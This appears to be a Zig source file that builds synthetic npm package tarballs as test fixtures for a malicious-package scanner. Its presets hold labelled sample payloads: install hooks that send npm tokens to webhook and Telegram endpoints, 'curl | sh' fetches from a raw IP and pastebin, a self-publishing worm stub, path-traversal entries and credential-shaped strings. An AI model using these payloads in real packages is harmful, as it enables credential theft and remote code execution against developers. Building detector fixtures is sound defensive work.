// forge.zig — deterministic synthetic npm package fixtures.
// Same discipline as the scanners: build in memory, write once, byte-identical.
const std = @import("std");
const models = @import("models.zig");

const Entry = struct {
    name: []const u8,
    kind: models.EntryKind = .file,
    mode: u32 = 0o644,
    link: []const u8 = "",
    content: []const u8 = "",
};

fn octal(buf: []u8, value: u64, width: usize) []const u8 {
    // width includes trailing NUL slot: e.g. mode 7+1, size 11+1
    var tmp: [24]u8 = undefined;
    const digits = std.fmt.bufPrint(&tmp, "{o}", .{value}) catch unreachable;
    const body = width - 1;
    var i: usize = 0;
    for (0..body) |k| {
        buf[k] = if (k < body - digits.len) '0' else digits[k - (body - digits.len)];
        i += 1;
    }
    buf[i] = 0;
    return buf[0..width];
}

fn writeHeader(out: *std.ArrayList(u8), e: Entry, longname: ?[]const u8) !void {
    var hdr = [_]u8{0} ** 512;
    if (longname) |ln| {
        @memcpy(hdr[0..@min(ln.len, 100)], ln[0..@min(ln.len, 100)]);
    } else {
        @memcpy(hdr[0..@min(e.name.len, 100)], e.name[0..@min(e.name.len, 100)]);
    }
    _ = octal(hdr[100..108], e.mode, 8);
    _ = octal(hdr[108..116], 0, 8); // uid
    _ = octal(hdr[116..124], 0, 8); // gid
    _ = octal(hdr[124..136], if (e.kind == .file) e.content.len else 0, 12);
    _ = octal(hdr[136..148], 0, 12); // mtime: deterministic
    @memset(hdr[148..156], ' '); // chksum placeholder
    hdr[156] = switch (e.kind) {
        .file => '0',
        .directory => '5',
        .symlink => '2',
        .other => '0',
    };
    if (e.kind == .symlink) {
        @memcpy(hdr[157..@min(157 + e.link.len, 257)], e.link[0..@min(e.link.len, 100)]);
    }
    @memcpy(hdr[257..263], "ustar\x00");
    @memcpy(hdr[263..265], "00");

    var sum: u64 = 0;
    for (hdr) |b| sum += b;
    var chk_buf: [8]u8 = undefined;
    const chk = octal(&chk_buf, sum, 7); // 6 digits + NUL
    @memcpy(hdr[148..154], chk[0..6]);
    hdr[154] = 0;
    hdr[155] = ' ';

    try out.appendSlice(&hdr);
}

fn appendEntry(out: *std.ArrayList(u8), e: Entry, alloc: std.mem.Allocator) !void {
    // GNU longname for entries that do not fit ustar's 100-char name
    if (e.name.len > 100) {
        var hdr = [_]u8{0} ** 512;
        @memcpy(hdr[0..13], "././@LongLink");
        _ = octal(hdr[100..108], 0o644, 8);
        _ = octal(hdr[108..116], 0, 8);
        _ = octal(hdr[116..124], 0, 8);
        _ = octal(hdr[124..136], e.name.len + 1, 12);
        _ = octal(hdr[136..148], 0, 12);
        @memset(hdr[148..156], ' ');
        hdr[156] = 'L';
        @memcpy(hdr[257..263], "ustar\x00");
        @memcpy(hdr[263..265], "00");
        var sum: u64 = 0;
        for (hdr) |b| sum += b;
        var chk_buf: [8]u8 = undefined;
        const chk = octal(&chk_buf, sum, 7);
        @memcpy(hdr[148..154], chk[0..6]);
        hdr[154] = 0;
        hdr[155] = ' ';
        try out.appendSlice(&hdr);
        try out.appendSlice(e.name);
        try out.append(0);
        const pad = (512 - ((e.name.len + 1) % 512)) % 512;
        try out.appendNTimes(0, pad);
        const short = e.name[0..@min(e.name.len, 100)];
        const copy = try alloc.dupe(u8, short);
        try writeHeader(out, .{ .name = copy, .kind = e.kind, .mode = e.mode, .link = e.link, .content = e.content }, null);
        alloc.free(copy);
    } else {
        try writeHeader(out, e, null);
    }
    if (e.kind == .file) {
        try out.appendSlice(e.content);
        const pad = (512 - (e.content.len % 512)) % 512;
        try out.appendNTimes(0, pad);
    }
}

pub fn buildTar(alloc: std.mem.Allocator, entries: []const Entry, out: *std.ArrayList(u8)) !void {
    for (entries) |e| try appendEntry(out, e, alloc);
    try out.appendNTimes(0, 1024); // end-of-archive
}

// ---- presets -------------------------------------------------------------
const clean_pkg =
    \\{
    \\  "name": "@lab/left-pad-clone",
    \\  "version": "1.0.0",
    \\  "description": "pads strings. that is all.",
    \\  "scripts": { "build": "node-gyp rebuild" },
    \\  "main": "lib/index.js",
    \\  "license": "MIT"
    \\}
;
const clean_index =
    \\module.exports = function pad(str, len, ch) {
    \\  str = String(str);
    \\  while (str.length < len) str = ch + str;
    \\  return str;
    \\};
;

const clipper_pkg =
    \\{
    \\  "name": "reactk-components",
    \\  "version": "2.4.1",
    \\  "description": "react ui kit",
    \\  "scripts": { "postinstall": "node scripts/postinstall.js" },
    \\  "main": "lib/index.js"
    \\}
;
const clipper_postinstall =
    \\const { exec } = require('child_process');
    \\const https = require('https');
    \\const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN;
    \\const payload = Buffer.from(JSON.stringify({
    \\  token: token,
    \\  cwd: process.cwd(),
    \\  env: process.env.HOME
    \\})).toString('base64');
    \\https.request('https://webhook.site/1a2b3c4d?d=' + payload).end();
    \\exec('curl -fsSL http://45.61.184.9/fetch.sh | sh');
;

const worm_pkg =
    \\{
    \\  "name": "shai-hulud-worker",
    \\  "version": "9.9.9",
    \\  "scripts": { "preinstall": "node setup.js" },
    \\  "main": "setup.js"
    \\}
;
const worm_setup =
    \\const { execSync } = require('child_process');
    \\const secret = Buffer.from(process.env.NPM_TOKEN, 'utf8');
    \\eval(Buffer.from('cmVxdWlyZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUiKQ==', 'base64') + '');
    \\execSync('trufflehog filesystem --json > /tmp/.h');
    \\execSync('npm publish --access public');
;
const worm_workflow =
    \\name: CI
    \\on: [push]
    \\jobs:
    \\  build:
    \\    runs-on: ubuntu-latest
    \\    steps:
    \\      - run: curl -fsSL https://pastebin.com/raw/AAAAAAAA | sh
;

const traversal_pkg =
    \\{
    \\  "name": "helpful-utils",
    \\  "version": "0.0.3",
    \\  "main": "index.js"
    \\}
;
const traversal_index = "module.exports = {};\n";

const typosquat_pkg =
    \\{
    \\  "name": "reqeust",
    \\  "version": "1.2.3",
    \\  "description": "http client",
    \\  "scripts": { "install": "node install.js" },
    \\  "main": "index.js"
    \\}
;
const typosquat_install =
    \\// mimics request's install-time telemetry
    \\require('https').get('https://api.telegram.org/bot1234:AA/report?n=' + process.env.USER);
;

const secrets_pkg =
    \\{
    \\  "name": "deployment-helper",
    \\  "version": "3.1.0",
    \\  "main": "lib/deploy.js"
    \\}
;
const secrets_lib = "const GITHUB_TOKEN = \"" ++ "ghp_" ++ "16C7e42F292c6912E7710c838347Ae178B4a" ++ "\"\n" ++
    "const AWS_KEY = \"" ++ "AKIA" ++ "IOSFODNN7EXAMPLE" ++ "\"\n" ++
    "const SLACK = \"" ++ "xoxp" ++ "-123456789012-123456789012-123456789012-abcd" ++ "\"\n" ++
    "const WEBHOOK = \"https://keys.example/collector\";\n";

pub const presets = [_]struct { name: []const u8, desc: []const u8, entries: []const Entry }{
    .{
        .name = "clean",
        .desc = "a boring utility package. verdict: clean.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = clean_pkg },
            .{ .name = "package/lib/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/lib/index.js", .content = clean_index },
            .{ .name = "package/README.md", .content = "# left-pad-clone\n\npads strings.\n" },
        },
    },
    .{
        .name = "clipper",
        .desc = "postinstall harvests credentials, calls an exfil webhook, pipes remote code into shell.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = clipper_pkg },
            .{ .name = "package/scripts/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/scripts/postinstall.js", .content = clipper_postinstall },
        },
    },
    .{
        .name = "worm",
        .desc = "Shai-Hulud-style: preinstall payload, credential sweep, self-publish, injected workflow.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = worm_pkg },
            .{ .name = "package/setup.js", .content = worm_setup },
            .{ .name = "package/.github/workflows/shai-hulud-workflow.yml", .content = worm_workflow },
        },
    },
    .{
        .name = "traversal",
        .desc = "zip-slip entries, escaping symlink, double extension.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = traversal_pkg },
            .{ .name = "package/index.js", .content = traversal_index },
            .{ .name = "../.bashrc", .content = "HISTFILE=/dev/null\n" },
            .{ .name = "/etc/hosts", .content = "127.0.0.1 localhost\n" },
            .{ .name = "package/escape", .kind = .symlink, .link = "../../../outside" },
            .{ .name = "package/invoice.pdf.js", .content = "// looks like a pdf\n" },
        },
    },
    .{
        .name = "typosquat",
        .desc = "one edit away from a household name, phones home on install.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = typosquat_pkg },
            .{ .name = "package/install.js", .content = typosquat_install },
        },
    },
    .{
        .name = "secrets",
        .desc = "shipped with live-looking credentials baked into source.",
        .entries = &.{
            .{ .name = "package/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/package.json", .content = secrets_pkg },
            .{ .name = "package/lib/", .kind = .directory, .mode = 0o755 },
            .{ .name = "package/lib/deploy.js", .content = secrets_lib },
        },
    },
};

pub fn presetByName(name: []const u8) ?*const @TypeOf(presets[0]) {
    for (&presets) |*p| {
        if (std.mem.eql(u8, p.name, name)) return p;
    }
    return null;
}

pub fn writePreset(alloc: std.mem.Allocator, name: []const u8, out_path: []const u8) !u64 {
    const p = presetByName(name) orelse return error.UnknownPreset;
    var buf = std.ArrayList(u8).init(alloc);
    defer buf.deinit();
    try buildTar(alloc, p.entries, &buf);
    const f = try std.fs.cwd().createFile(out_path, .{});
    defer f.close();
    try f.writeAll(buf.items);
    return buf.items.len;
}

// ---- tests ---------------------------------------------------------------
test "octal formatting" {
    var buf: [8]u8 = undefined;
    try std.testing.expectEqualStrings("0000644\x00", octal(&buf, 0o644, 8));
    var buf2: [12]u8 = undefined;
    try std.testing.expectEqualStrings("00000001234\x00", octal(&buf2, 0o1234, 12));
}

test "buildTar deterministic + parseable" {
    const a = std.testing.allocator;
    var b1 = std.ArrayList(u8).init(a);
    defer b1.deinit();
    var b2 = std.ArrayList(u8).init(a);
    defer b2.deinit();
    try buildTar(a, presets[0].entries, &b1);
    try buildTar(a, presets[0].entries, &b2);
    try std.testing.expectEqualSlices(u8, b1.items, b2.items);

    // parse it back with std.tar
    var fbs = std.io.fixedBufferStream(b1.items);
    var name_buf: [std.fs.max_path_bytes]u8 = undefined;
    var link_buf: [std.fs.max_path_bytes]u8 = undefined;
    var iter = std.tar.iterator(fbs.reader(), .{ .file_name_buffer = &name_buf, .link_name_buffer = &link_buf });
    var count: usize = 0;
    var saw_pkgjson = false;
    while (try iter.next()) |f| {
        count += 1;
        if (std.mem.endsWith(u8, f.name, "package.json")) saw_pkgjson = true;
    }
    try std.testing.expectEqual(@as(usize, 5), count);
    try std.testing.expect(saw_pkgjson);
}

test "presets registered and unique" {
    var seen: usize = 0;
    for (&presets) |p| {
        _ = p;
        seen += 1;
    }
    try std.testing.expectEqual(@as(usize, 6), seen);
    try std.testing.expect(presetByName("clean") != null);
    try std.testing.expect(presetByName("nope") == null);
}
